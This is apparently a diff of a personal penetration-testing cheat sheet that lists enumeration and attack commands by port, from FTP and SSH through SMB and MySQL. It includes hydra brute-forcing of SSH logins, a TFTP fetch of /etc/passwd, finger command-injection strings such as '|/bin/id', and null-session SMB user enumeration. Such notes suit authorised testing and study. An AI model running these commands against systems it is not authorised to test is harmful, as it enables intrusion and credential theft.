@@ -1,32 +1,57 @@
-HTTP (p 80, 443):
-nikto -o nikto.txt -host {ip}
-dirbuster
-gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u {ip}
-burp
-wpscan
-
-
 FTP (p 21):
+telnet {ip} 21
+ftp {ip}
+ftp@{ip}
 ftp anonymous@{ip}
 
 SSH (p 22):
+telnet {ip} 22
+ssh root@{ip}
 ssh_enum_v0.3.py -a -u {userwordlist} -i {ip}
 hydra -l {username} -x 4:10:aA {ip} ssh
 hydra -l {username} -P /usr/share/wordlists/rockyou.txt {ip} ssh
 
+Telnet (p 23):
+telnet {ip}
 
-SMB (p 139, 445):
+smtp (p 25):
+nc -nv {ip} {port}
+telnet {ip} 25
+--> VRF bob
+
+TFTP (p 69):
+tftp {ip} PUT {myfile}
+tftp {ip} GET conf.txt
+tftp -i {ip} GET /etc/passwd
+
+Finger (p 79):
+finger 'a b c d e f g h'@{ip}
+finger admin@{ip}
+finger "|/bin/id@{ip}"
+finger "|/bin/ls -a /@{ip}"
+
+HTTP (p 80, 443):
+nikto -o nikto.txt -host {ip}
+dirbuster
+gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u {ip}
+page source?
+burp?
+wpscan?
+sqlinjection?
+telnet {ip} {port}
+
+
+SMB, NETBIOS (p 139, 445):
 rpcclient -u "" {ip}
   --> srvinfo
   --> enumdomusers
-  --> getdompwinfo
-  
-  enum4linux -v {ip}
-  
-  
-  smtp:
-  nc -nv {ip} {port}
-  --> VRF bob
-  
-  smnp:
-  smnpwalk -c public
+  --> getdompwinfo  
+enum4linux -v {ip}
+
+MySQL (p 3306):
+nmap -A -n -p3306 {ip}
+nmap -A -n -PN --script:ALL -p3306 {ip}
+telnet {ip} 3306
+use test; select * from test;
+To check for other DB's -- show database
+
